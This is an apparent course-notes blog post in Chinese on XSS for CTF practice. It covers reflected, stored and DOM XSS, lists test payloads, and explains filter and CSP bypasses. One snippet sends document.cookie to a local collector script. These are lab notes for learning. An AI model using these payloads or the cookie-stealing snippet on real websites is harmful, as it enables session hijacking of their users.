---
title: 3-XSS渗透与防御
date: 2025-08-13 13:37:07
tags: [CTF, web, 马士兵]
---

客户端的Cookie: 记录登录状态，跟踪用户行为

服务端的Session

## JavaScript操作Cookie

获取和设置：
```javascript
document.cookie;
document.cookie=‘name=abc’;
```
无法删除，只能通过更改过期时间删除。

## 脚本注入网页：XSS(Cross Site Script)
```javascript
<script>alert(1)</script>
```

<!--more-->

### 反射型XSS

![](/img/msb/17376208071206.png)

### 存储型（持久型）XSS

![](/img/msb/17376210736185.png)

### 实例：获取Cookie发送邮件
```javascript
var img = document.createElement(‘img’);
img.width = 0;
img.height = 0;
img.src = ‘http://localhost/xss/sendmail.php?mycookie=‘+encodeURIComponent(document.cookie); 
```

## XSS检测和利用

### 测试payload
```javascript
<script>alert(‘XSS’)</script>
<script>alert(document.cookie)</script>
><script>alert(document.cookie)</script>
>=‘><script>alert(document.cookie)</script>
“><script>alert(document.cookie)</script>
%3Cscript%3Ealert(document.cookie)%3C/script%3E
<img src=“javascript:alert(‘XSS’)”>
onerror=“alert(‘XSS’)”>
```

SVG标签会将XML实体解析后加入标签，eval函数能够接受十六进制的字符串，可用于绕过一些符号过滤。
```javascript
<svg><script>prompt%#x28;1)</script></svg>

<script>eval.call`${‘prompt\x281)’}`</script>
```

### 自动化检测工具

XSSER: xsser.03c8.net

XSSSTRIKE

## XSS防御方法

----

### 反射型XSS

恶意代码未被服务器储存，每次触发漏洞时，都将恶意代码通过GET/POST方式提交，用户输入的内容被直接输出在HTML中，然后触发漏洞。

若注入点在标签内部，则不需要插入标签。例如script标签内部，可以直接插入javascript语句，类似SQL注入，先闭合引号，再注释后面的引号。
其他标签内，可以先闭合引号，再插入可以执行javascript代码的属性进行XSS攻击。

### 存储型XSS

与反射型基本思路相同，都是在后端未对用户输入进行过滤导致的漏洞，但存储型XSS将用户输入保存在数据库或其他的服务器存储中，只要服务保存了XSS代码，便可造成持续性的影响，相比之下更具威胁性。

在实际环境中，常见于用户发的帖子或个人信息等页面，其他用户访问时便触发XSS。

### DOM(Document Obect Model, 文档对象模型)型XSS

漏洞发生于前端而非后端，前端将用户输入直接写入到了HTML中。Javascript具有操作DOM的功能，可以提取用户的输入，直接插入到DOM中，造成XSS。

payload与反射/存储型相同，如`name=<script>alert(‘aminos’)</script>`

注意，只有document.write()函数才会执行script标签内的代码，而通过修改DOM属性innerHTML插入HTML内容不会执行其中script标签内代码，但可以通过插入`<img scr=x onerror=alert(1)>`的方法执行类似onerror属性中的javascript代码。

## 可以用于执行XSS的标签

1. 几乎所有的标签on事件，如`<h1 onmousemove=“alert(1)”>hello</h1>`
   另一个常见的是img标签的onerror属性

```javascript
<iframe src=“javascript:alert(1)”></frame>
<svg onload=“alert(1)”>
```

参考portswigger.net/web-security/cross-site-scripting/cheat-sheet

2. HTML5特性的XSS，参考www.html5sec.org
   很多标签的on属性需要用户交互才能完成触发，如`<input onfocus=‘alert(1)>`，输入框获得焦点后才能触发alert(1)
   但HTML5的autofocus可以自动实现聚焦，让需要交互的XSS变成了无需交互的XSS，降低了成本。

```javascript
<input onfocus=‘alert(1)’ autofocus>
```

3. javascript伪协议
   如`javascript:void(0)`中，”javascript:”表示javascript伪协议，它是由javascript引擎来执行的，如

```javascript
<a href=“javascript:alert(1)”>click here</a>
```

iframe标签也可以使用javascript伪协议，实现自动触发，如

```javascript
<iframe src=“javascript:alert(1)”>
```

## 防御

过滤主要有WAF层和代码层，WAF层通常在外部，在主机或网络硬件上对HTTP请求进行过滤拦截，而代码层是在编写web应用的过程中实现对用户输入进行过滤。
但javascript语法非常灵活，所以对于普通的正则匹配和字符串比较，很难拦截XSS。

1. 富文本过滤
   大多数富文本编辑器都允许用户直接编辑HTML，从而引入了XSS漏洞。常见过滤方式是对用户输入的标签进行限制，我们可以寻找黑名单中遗漏的标签。
   参考portswigger.net/web-security/cross-site-scripting/cheat-sheet
   如果过滤器本身存在缺陷，如将黑名单替换为空，则可以采用双写绕过。

2. 注入点在标签属性中
   如果没有过滤<和>，可以直接引入新的标签，如果尖括号被过滤，可以插入新的事件属性，如onload, onmousemove。
   标签的字段支持HTML编码，可以借此绕过一些过滤。如：

```javascript
<img scr=x onerror=“&#x61;&#x6c;&#x65;&#x72;&#x28;&#x31;&#x29;”>
```

onerror内内容即alert(1)进行HTML编码后的结果。

3. 注入点在script标签中
   如果注入点被引号包裹，可以像SQL注入一样，先闭合引号，再用分号结束语句，然后插入代码。
   如果引号被过滤，且一行存在两个注入点：
   `var url=‘http://example.com/?name=<?=$name?>’+’<?=$address?>’`
   可以用反斜杠使第一个反引号被转义，从第二个引号开始插入代码：
   `var url=‘http://example.com/?name=\‘+’;alert(1);\\`
   \是name的值，;alert(1);\\是address的值。
   如果存在单词黑名单，如不允许出现eval等字符，可以用unicode编码绕过。

```javascript
\u0065\u0076\u0061\u006c(‘alert(1)’)
```

4. CSP过滤及其绕过
   CSP(Content Security Policy)是一个额外的安全层，用于检测并缓解某些特定类型的注入，包括XSS和数据注入等。
   ![](/img/msb/17376413018599.png)
   绕过script-scr ‘self’, self意味着只允许加载同域名目录下的脚本，所以我们可以寻找文件上传或jsonp借口。
   需要注意的是，如果是图片上传接口，即访问资源时的Content-Type为image/png, 浏览器会拒绝将其作为脚本执行。
   jsonp接口一般采用?callback=xxx的方式传参，如`xxx({“result”:”success”})`
   此时若传`callback=alert(1);//`，就会产生这样的返回：
   `alert(1);//({“result”:”success”})`